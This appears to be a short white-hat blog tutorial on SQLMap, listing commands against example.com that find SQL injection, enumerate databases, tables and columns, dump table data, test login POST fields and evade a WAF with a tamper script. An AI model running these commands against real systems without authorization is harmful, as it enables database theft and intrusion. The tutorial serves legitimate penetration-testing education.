+++
categories = ["sql-injection", "white-hat", "hacker"]
date = 2024-07-06T23:22:28Z
description = ""
draft = false
image = "https://images.unsplash.com/photo-1622445275576-721325763afe?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wxMTc3M3wwfDF8c2VhcmNofDF8fFdoaXRlJTIwaGF0fGVufDB8fHx8MTcyMDMwMjk0MHww&ixlib=rb-4.0.3&q=80&w=2000"
slug = "sql-injection-with-sqlmap"
tags = ["sql-injection", "white-hat", "hacker"]
title = "SQL Injection with SQLMap #whitehat"

+++


SQLMap is a powerful and popular open-source tool used to detect and exploit SQL injection vulnerabilities.

Let's dive into a basic usage of SQLMap.

## Pre-Requirements

#### Linux Installation

```bash
sudo apt-get install sqlmap
```

#### Windows Installation

* Download and install from SQLMap from the [official website](https://sqlmap.org/)

{{< figure src="https://res-3.cloudinary.com/dgoa5llvh/image/upload/q_auto/sql-maps.png" caption="SQL Map" >}}

## Basic Usage

In the terminal or command prompt. Run SQLMap with a target URL that is suspected of being vulnerable to SQL injection:

```bash
sqlmap -u "http://example.com/page?id=1"
```

#### Basic Options

* `-u URL, --url=URL`: Specifies the URL to test.
* `--data`: Specifies data for POST requests.
* `-p`: Specifies the parameter to test (if the URL has multiple parameters).
* `--dbs`: Enumerates databases.
* `-D`: Specifies a database to use with other options (e.g., dump tables).
* `--tables`: Enumerates tables in the specified database.
* `-T`: Specifies a table to use with other options (e.g., dump columns).
* `--columns`: Enumerates columns in the specified table.
* `--dump`: Dumps the data from the specified table or columns.

## Commands

Testing for Vulnerability.

```bash
sqlmap -u "http://example.com/page?id=1"
```

Enumerating Databases.

```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```

Enumerating Tables in a Database.

```bash
sqlmap -u "http://example.com/page?id=1" -D database_name --tables
```

Enumerating Columns in a Table.

```bash
sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns
```

Dumping Data from a Table.

```bash
sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --dump
```

## Advanced Usage

Posting Data.

```bash
sqlmap -u "http://example.com/login" --data="username=user&password=pass"
```

Specify Parameter to Test.

```bash
sqlmap -u "http://example.com/page?param1=1&param2=2" -p param1
```

Bypass WAF/IDS.

```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
```

## Tips

* Always ensure you have permission to test the target
* Use tamper scripts to bypass security filters (e.g., `--tamper=space2comment`)
* Combine options for more comprehensive testing

For more detailed usage and advanced options, refer to the [SQLMap official documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

